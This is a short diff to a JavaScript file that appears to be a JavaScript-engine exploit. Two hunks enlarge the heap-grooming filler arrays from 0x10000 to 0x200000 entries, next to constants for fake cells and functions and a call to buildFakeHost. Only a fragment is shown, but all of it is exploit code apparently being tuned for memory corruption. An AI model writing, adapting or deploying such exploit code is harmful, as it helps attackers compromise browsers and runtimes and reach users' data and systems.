@@ -6,7 +6,7 @@ const DUPLICATE_INDEX = 2;
 const CONTROL_INDEX = 0xffff;
 const CONTROL_INT = -64000;
 const FILLER_BIGINTS = K - 1;
-const FILLER_OBJECTS = 0x10000 - K;
+const FILLER_OBJECTS = 0x200000 - K;
 const EXPECTED_LENGTH = 0x50001;
 const CELL_BYTES = 0x30;
 const FUNCTION_BYTES = 0x20;
@@ -647,7 +647,7 @@ function buildAndStoreGraph() {
     buildFakeHost();
 
     emit("SSV-BUILD", `k=${K}-n=${DRAIN_COUNT}`);
-    fillerGraph = new Array(0x10000);
+    fillerGraph = new Array(0x200000);
     let pos = 0;
     
     for (let b = 0; b < FILLER_BIGINTS; ++b)
